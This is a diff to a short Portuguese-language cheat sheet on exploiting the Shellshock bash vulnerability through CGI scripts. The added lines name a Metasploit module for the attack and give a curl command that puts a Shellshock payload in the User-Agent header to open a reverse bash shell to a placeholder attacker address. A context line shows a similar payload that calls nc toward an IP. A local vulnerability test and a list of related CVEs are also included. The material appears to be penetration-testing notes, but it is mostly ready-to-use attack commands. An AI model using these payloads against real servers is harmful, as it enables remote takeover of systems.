@@ -4,6 +4,11 @@
 
  Para exploração é necessário que a aplicação utilize o bash pois a vulnerabilidade explora uma falha na declaração de variáveis de ambiente.
 
+
+ - EXPLOITAR PELO MSFCONSOLE
+
+ 	exploit/multi/http/apache_mod_cgi_bash_env_exec
+
  - COMO TESTAR 
 
  env x='() { :;}; echo Estou vulneravel' bash -c "echo Isto foi um teste"
@@ -33,3 +38,8 @@ echo  "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.16
 - CVEs:
 
  CVE-2014-6277, CVE-2014-6278, CVE-2014-7169,CVE-2014-7186, CVE-2014-7187
+
+
+ CURL
+
+ 	curl -A "() { :;}; /bin/bash -i>& /dev/tcp/IPDOATACANTE/6677 0>&1" http://ipdoalvo/cgi-bin/status
